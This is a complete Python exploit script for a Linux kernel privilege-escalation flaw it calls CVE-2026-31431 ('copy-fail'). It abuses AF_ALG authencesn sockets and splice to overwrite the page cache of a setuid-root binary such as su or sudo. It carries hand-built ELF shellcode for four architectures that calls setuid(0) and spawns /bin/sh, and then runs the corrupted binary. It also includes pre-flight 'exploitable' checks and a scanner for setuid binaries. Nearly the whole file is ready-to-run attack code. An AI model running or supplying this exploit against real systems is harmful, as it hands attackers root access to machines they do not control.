#!/usr/bin/env python3
# CVE-2026-31431 (copy-fail) — Python implementation
# Requires: Python 3.6+, Linux kernel with AF_ALG + authencesn support
# os.splice (3.12+) is used when available; ctypes fallback covers 3.6–3.11.
# Supported architectures: x86_64, i386/i686, armv6l/armv7l, aarch64.  macOS is NOT supported.
# See https://copy.fail for more information.

import ctypes
import logging
import os
import platform
import socket
import stat
import struct
import sys
import zlib

logging.basicConfig(format="%(message)s", level=logging.INFO)

SOL_ALG               = 279
ALG_SET_KEY           = 1
ALG_SET_IV            = 2
ALG_SET_OP            = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5

# Setuid-root binaries to try, in preference order.
# The first one that exists and has the setuid-root bit set will be used.
_SUID_TARGETS = [
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/passwd",
    "/usr/bin/newgrp",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/sudo",
]

# splice is in os since 3.12; fall back to libc on older runtimes
if hasattr(os, "splice"):
    def _splice(fd_in, fd_out, count, offset_src=None):
        kw = {} if offset_src is None else {"offset_src": offset_src}
        os.splice(fd_in, fd_out, count, **kw)
else:
    _libc = ctypes.CDLL(None, use_errno=True)
    _libc.splice.argtypes = [
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_size_t, ctypes.c_uint,
    ]
    _libc.splice.restype = ctypes.c_ssize_t

    def _splice(fd_in, fd_out, count, offset_src=None):
        off = ctypes.c_int64(offset_src) if offset_src is not None else None
        off_ref = ctypes.byref(off) if off is not None else None
        _libc.splice(fd_in, off_ref, fd_out, None, count, 0)


def _c(f, t, chunk):
    """Core vulnerability trigger — overwrites 4 bytes of the target file's page cache."""
    # 1. Create AF_ALG cryptographic socket
    alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    try:
        # 2. Bind to the vulnerable Authenticated Encryption wrapper
        alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))", 0, 0))

        # 3. Set dummy key; authsize passed via optlen (kernel reads len, not val)
        key = bytes.fromhex("0800010000000010" + "00" * 32)
        alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
        alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)

        # 4. Accept operational socket — AF_ALG ignores addr/addrlen
        u, _ = alg.accept()
        try:
            # 5+6. Send payload with CMSG control messages configuring encryption state
            ancdata = [
                (SOL_ALG, ALG_SET_OP,           b"\x00" * 4),            # decrypt
                (SOL_ALG, ALG_SET_IV,            b"\x10" + b"\x00" * 19), # ivlen=16, IV=zeros
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + b"\x00" * 3),  # assoclen=8
            ]
            u.sendmsg([b"AAAA" + chunk], ancdata, socket.MSG_MORE)

            # 7. Create pipe
            rfd, wfd = os.pipe()
            try:
                n = t + 4
                # 8. Splice: file -> pipe, then pipe -> crypto socket
                _splice(f.fileno(), wfd, n, offset_src=0)
                _splice(rfd, u.fileno(), n)
                # 9. Read response — triggers the memory-overwrite condition
                try:
                    u.recv(8 + t)
                except OSError:
                    pass
            finally:
                os.close(rfd)
                os.close(wfd)
        finally:
            u.close()
    finally:
        alg.close()


def _get_payload():
    """Select the correct ELF payload for the host architecture."""
    if sys.platform != "linux":
        sys.exit(
            f"fatal: {sys.platform} is not supported — CVE-2026-31431 is a Linux "
            "kernel vulnerability (AF_ALG / splice). Run inside a Linux VM."
        )

    arch = platform.machine()

    if arch == "x86_64":
        # 160-byte ELF64 (x86_64): setuid(0) + execve(/bin/sh) + exit(1)
        # Source: https://github.com/theori-io/copy-fail-CVE-2026-31431
        return zlib.decompress(bytes.fromhex(
            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
            "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
            "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
        ))

    if arch in ("i386", "i686"):
        # 121-byte ELF32 (i386): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=23, execve=11, exit=1  (int 0x80 ABI)
        # jmp/call trick: call pushes &"/bin/sh" onto stack; pop ebx retrieves it
        return bytes.fromhex(
            # ELF32 header (52 bytes)
            "7f454c46"               # magic
            "010101000000000000000000"  # ELF32, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "0300"                   # e_machine = EM_386
            "01000000"               # e_version = 1
            "54800408"               # e_entry = 0x08048054  (52+32 = 84 = 0x54 bytes in)
            "34000000"               # e_phoff = 0x34 = 52
            "00000000"               # e_shoff = 0
            "00000000"               # e_flags = 0
            "3400"                   # e_ehsize = 52
            "2000"                   # e_phentsize = 32
            "0100"                   # e_phnum = 1
            "2800"                   # e_shentsize = 40
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF32 program header (32 bytes)
            "01000000"               # p_type  = PT_LOAD
            "00000000"               # p_offset = 0
            "00800408"               # p_vaddr = 0x08048000
            "00800408"               # p_paddr = 0x08048000
            "79000000"               # p_filesz = 121
            "79000000"               # p_memsz  = 121
            "05000000"               # p_flags = PF_R | PF_X
            "00100000"               # p_align = 0x1000
            # Code (37 bytes)
            "31c0"                   # xor eax, eax
            "b017"                   # mov al, 23         ; setuid syscall
            "31db"                   # xor ebx, ebx       ; uid = 0
            "cd80"                   # int 0x80
            "eb0e"                   # jmp +14            ; → call at offset 24
            "5b"                     # pop ebx            ; ebx = &"/bin/sh"
            "31c9"                   # xor ecx, ecx       ; argv = NULL
            "31d2"                   # xor edx, edx       ; envp = NULL
            "b00b"                   # mov al, 11         ; execve syscall
            "cd80"                   # int 0x80
            "31c0"                   # xor eax, eax
            "40"                     # inc eax            ; exit syscall
            "cd80"                   # int 0x80
            "e8edffffff"             # call -19           ; ← push &"/bin/sh", jmp pop
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    if arch in ("armv7l", "armv6l", "armv5l", "arm"):
        # 136-byte ELF32 (ARM32 EABI): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=23, execve=11, exit=1  (svc #0 / swi #0 EABI, same encoding)
        # Address of "/bin/sh": add r0, pc, #24
        #   ARM pipeline: pc = instr_addr + 8, so at code offset 12: pc = 20
        #   string is at code offset 44 → 44 - 20 = 24
        return bytes.fromhex(
            # ELF32 header (52 bytes)
            "7f454c46"               # magic
            "010101000000000000000000"  # ELF32, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "2800"                   # e_machine = EM_ARM (40 = 0x28)
            "01000000"               # e_version = 1
            "54800408"               # e_entry = 0x08048054  (52+32 = 84 = 0x54 bytes in)
            "34000000"               # e_phoff = 52
            "00000000"               # e_shoff = 0
            "00000005"               # e_flags = EF_ARM_EABI_VER5 (0x05000000 in LE)
            "3400"                   # e_ehsize = 52
            "2000"                   # e_phentsize = 32
            "0100"                   # e_phnum = 1
            "2800"                   # e_shentsize = 40
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF32 program header (32 bytes)
            "01000000"               # p_type  = PT_LOAD
            "00000000"               # p_offset = 0
            "00800408"               # p_vaddr = 0x08048000
            "00800408"               # p_paddr = 0x08048000
            "88000000"               # p_filesz = 136 (52+32+52)
            "88000000"               # p_memsz  = 136
            "05000000"               # p_flags = PF_R | PF_X
            "00100000"               # p_align  = 0x1000
            # Code (44 bytes) — ARM32 EABI, all instructions 32-bit LE
            "1770a0e3"               # mov r7, #23        ; setuid syscall
            "0000a0e3"               # mov r0, #0         ; uid = 0
            "000000ef"               # svc #0
            "18008fe2"               # add r0, pc, #24    ; → "/bin/sh" (pc=20, 20+24=44)
            "0010a0e3"               # mov r1, #0         ; argv = NULL
            "0020a0e3"               # mov r2, #0         ; envp = NULL
            "0b70a0e3"               # mov r7, #11        ; execve syscall
            "000000ef"               # svc #0
            "0170a0e3"               # mov r7, #1         ; exit syscall
            "0100a0e3"               # mov r0, #1         ; code = 1
            "000000ef"               # svc #0
            # Data (8 bytes)
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    if arch == "aarch64":
        # 172-byte ELF64 (aarch64): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=146, execve=221, exit=93
        return bytes.fromhex(
            # ELF64 header (64 bytes)
            "7f454c46"               # magic
            "020101000000000000000000"  # ELF64, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "b700"                   # e_machine = EM_AARCH64
            "01000000"               # e_version = 1
            "7800400000000000"       # e_entry = 0x400078  (64+56 = 120 = 0x78 bytes in)
            "4000000000000000"       # e_phoff = 0x40 = 64
            "0000000000000000"       # e_shoff = 0
            "00000000"               # e_flags = 0
            "4000"                   # e_ehsize = 64
            "3800"                   # e_phentsize = 56
            "0100"                   # e_phnum = 1
            "4000"                   # e_shentsize = 64
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF64 program header (56 bytes)
            "01000000"               # p_type  = PT_LOAD
            "05000000"               # p_flags = PF_R | PF_X
            "0000000000000000"       # p_offset = 0
            "0000400000000000"       # p_vaddr = 0x400000
            "0000400000000000"       # p_paddr = 0x400000
            "ac00000000000000"       # p_filesz = 172 (64+56+52)
            "ac00000000000000"       # p_memsz  = 172
            "0010000000000000"       # p_align  = 0x1000
            # Code (44 bytes) — all AArch64 instructions are 32-bit (LE)
            "481280d2"               # movz x8, #146    ; setuid syscall
            "000080d2"               # movz x0, #0      ; uid = 0
            "010000d4"               # svc  #0
            "00010010"               # adr  x0, #+32    ; → "/bin/sh" (offset 44 - 12 = 32)
            "010080d2"               # movz x1, #0      ; argv = NULL
            "020080d2"               # movz x2, #0      ; envp = NULL
            "a81b80d2"               # movz x8, #221    ; execve syscall
            "010000d4"               # svc  #0
            "a80b80d2"               # movz x8, #93     ; exit syscall
            "200080d2"               # movz x0, #1      ; code = 1
            "010000d4"               # svc  #0
            # Data (8 bytes)
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    sys.exit(
        f"fatal: unsupported architecture '{arch}' — "
        "only x86_64, i386/i686, armv6l/armv7l, and aarch64 payloads are included."
    )


def _find_target():
    """Return the first setuid-root binary from the candidate list."""
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                return path
        except OSError:
            continue
    sys.exit(
        "fatal: no suitable setuid-root binary found.\n"
        f"Searched: {', '.join(_SUID_TARGETS)}\n"
        "Tip: run with --scan to find all setuid-root binaries on this system."
    )


_SUPPORTED_ARCHS = {"x86_64", "i386", "i686", "armv5l", "armv6l", "armv7l", "arm", "aarch64"}

_SCAN_ROOTS = ["/usr", "/bin", "/sbin", "/opt", "/snap"]


def _scan_suid(roots=None):
    """Walk the filesystem and return all setuid-root binaries found."""
    found = []
    for base in (roots or _SCAN_ROOTS):
        try:
            for dirpath, _, files in os.walk(base, followlinks=False):
                for name in files:
                    path = os.path.join(dirpath, name)
                    try:
                        st = os.stat(path)
                        if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                            found.append(path)
                    except OSError:
                        continue
        except OSError:
            continue
    return sorted(found)


def _preflight():
    """
    Run pre-flight checks and print a diagnostic report.
    Returns True if the system looks exploitable, False otherwise.
    """
    arch  = platform.machine()
    ok    = True

    print("[*] Pre-flight check")
    print(f"    Kernel  : {platform.release()}")
    print(f"    Arch    : {arch}")
    print(f"    Python  : {platform.python_version()}")
    print(f"    splice  : {'os.splice (native)' if hasattr(os, 'splice') else 'ctypes fallback'}")

    # Already root?
    uid = os.getuid()
    if uid == 0:
        print("[!] Already running as root — nothing to do.")
        return False
    print(f"[+] UID     : {uid}  (not root)")

    # Architecture support
    if arch in _SUPPORTED_ARCHS:
        print(f"[+] Payload : available for {arch}")
    else:
        print(f"[-] Payload : NO payload for {arch}")
        ok = False

    # AF_ALG socket
    try:
        s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
        print("[+] AF_ALG  : socket creation OK")
    except OSError as e:
        print(f"[-] AF_ALG  : socket creation FAILED — {e}")
        ok = False

    # Required algorithm
    try:
        s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))", 0, 0))
        s.close()
        print("[+] Algo    : authencesn(hmac(sha256),cbc(aes)) available")
    except OSError as e:
        print(f"[-] Algo    : authencesn FAILED — {e}")
        print("    Fix     : modprobe authencesn; modprobe hmac; modprobe cbc")
        ok = False

    # SUID target
    target = None
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                target = path
                break
        except OSError:
            continue
    if target:
        print(f"[+] Target  : {target}  (setuid root)")
    else:
        print(f"[-] Target  : none found in shortlist — run --scan")
        ok = False

    print()
    print("[+] System looks EXPLOITABLE" if ok else "[-] System does NOT look exploitable")
    return ok


def main():
    for arg in sys.argv[1:]:
        if arg in ("-h", "--help", "-help"):
            prog = sys.argv[0]
            print(f"Usage: {prog} [--check | --scan | -h]", file=sys.stderr)
            print("", file=sys.stderr)
            print("  (no args)   Run the exploit", file=sys.stderr)
            print("  --check     Pre-flight diagnostics (AF_ALG, algo, arch, SUID target)", file=sys.stderr)
            print("  --scan      Walk filesystem and list all setuid-root binaries", file=sys.stderr)
            print("", file=sys.stderr)
            print("Python implementation of CVE-2026-31431 (copy-fail).", file=sys.stderr)
            print("Overwrites page cache of a setuid-root binary and runs it.", file=sys.stderr)
            print(f"Architectures: {', '.join(sorted(_SUPPORTED_ARCHS))}", file=sys.stderr)
            print("See https://copy.fail for more information.", file=sys.stderr)
            sys.exit(0)

        if arg in ("--check", "-check"):
            sys.exit(0 if _preflight() else 1)

        if arg in ("--scan", "-scan"):
            found = _scan_suid()
            print(f"Found {len(found)} setuid-root binary/binaries:")
            for t in found:
                print(f"  {t}")
            sys.exit(0)

    payload = _get_payload()
    target  = _find_target()

    with open(target, "rb") as f:
        logging.info("Target:   %s  (%d-byte payload, arch=%s)",
                     target, len(payload), platform.machine())
        logging.info("Overwriting page cache...")
        for i in range(0, len(payload), 4):
            _c(f, i, payload[i:i + 4])
            if len(payload) < 10000:
                if i % 100 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
            else:
                if i % 10000 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
        logging.info("  ... wrote %d bytes total", len(payload))

    logging.info("Executing payload via %s", target)
    os.execv(target, [target])


if __name__ == "__main__":
    main()
